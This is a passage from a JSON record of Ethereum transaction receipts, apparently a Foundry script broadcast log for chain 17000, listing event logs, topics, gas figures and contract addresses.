          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x930cae12dba4cc63781755709715d371401543060162fb3fddac87d691d6e326",
          "transactionIndex": "0x15",
          "logIndex": "0x5a",
          "removed": false
        }
      ],
      "logsBloom": "0x04000000000010000000000000020000000000000000000080000000000000000000000000000000000000000000000000000000000000000010000000800000340000000000000010008008000000000000000000000000000000100000000000020000020000401000000080400801000000400000000000008018000000000000000000200200000400000000001200000002000000000000100080004000000000000100000000000100000000000000000000000000000410000000000000001002000000400000000000000020000000000000000000002000000020002800000004000000000000000000400000000000008000020000000008200008",
      "type": "0x2",
      "transactionHash": "0x930cae12dba4cc63781755709715d371401543060162fb3fddac87d691d6e326",
      "transactionIndex": "0x15",
      "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
      "blockNumber": "0x2d5208",
      "gasUsed": "0x36907",
      "effectiveGasPrice": "0xbebc29",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xf7336fd84911203f1f01ab6803eccc984700f591",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x7dea25",
      "logs": [
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x0000000000000000000000006993eb3fadbc4c8e9c55c5e53edd68351d4f4d24",
            "0x0000000000000000000000006993eb3fadbc4c8e9c55c5e53edd68351d4f4d24",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x80a9489f601e923e0f68c34004fb412cdf58ee14d1067aade7332969d9b1a0ee",
          "transactionIndex": "0x16",
          "logIndex": "0x5b",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000006993eb3fadbc4c8e9c55c5e53edd68351d4f4d24",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x80a9489f601e923e0f68c34004fb412cdf58ee14d1067aade7332969d9b1a0ee",
          "transactionIndex": "0x16",
          "logIndex": "0x5c",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000010000000000000000000000200000000000000000000000002000000000000000080000000000000000100000000000000000000000000000000000000000010000000000000001002000000000000000000000000000000000000000000002000000000000000000004000000000000000000400000000000000000020000000000000000",
      "type": "0x2",
      "transactionHash": "0x80a9489f601e923e0f68c34004fb412cdf58ee14d1067aade7332969d9b1a0ee",
      "transactionIndex": "0x16",
      "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
      "blockNumber": "0x2d5208",
      "gasUsed": "0xc307",
      "effectiveGasPrice": "0xbebc29",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x6993eb3fadbc4c8e9c55c5e53edd68351d4f4d24",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x7fce4d",
      "logs": [
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x000000000000000000000000f35110f68f441fd3bd7d354a2a5faa1d32b970a7",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x5d",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
            "0x0000000000000000000000000000000000000000000000000000000000000000"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x5e",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000001",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x5f",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0x8b87591ea14d4d60f1ef5c629cc3c7c28d27afa2e992321f54571acd1d880569"
          ],
          "data": "0x",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x60",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x61",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x62",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
          "blockNumber": "0x2d5208",
          "blockTimestamp": "0x67647714",
          "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
          "transactionIndex": "0x17",
          "logIndex": "0x63",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000840000140000000000000010008008000000000000000000040000000000100000000000020000020000401000004080400801000000400000000000008018000100000000000000200000000400000000000000000002000000000000000080004000000000000100000000000000000000000000000000000000000010000000000000001102000000400000000000000020000000000000001000002000000060002800000004000000800000000000000000010000000000020000000008200008",
      "type": "0x2",
      "transactionHash": "0x65306de491e49ec10cc208aa07fcbfae3e3a9a2decdb3bf4b115db227ae78576",
      "transactionIndex": "0x17",
      "blockHash": "0x5ed9c657b9ef95af9b57e1cc630eb6de0983e7599c5ced37eea889635860c171",
      "blockNumber": "0x2d5208",
      "gasUsed": "0x1e428",
      "effectiveGasPrice": "0xbebc29",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1734637334,
  "chain": 17000,
  "commit": "58111ea"
}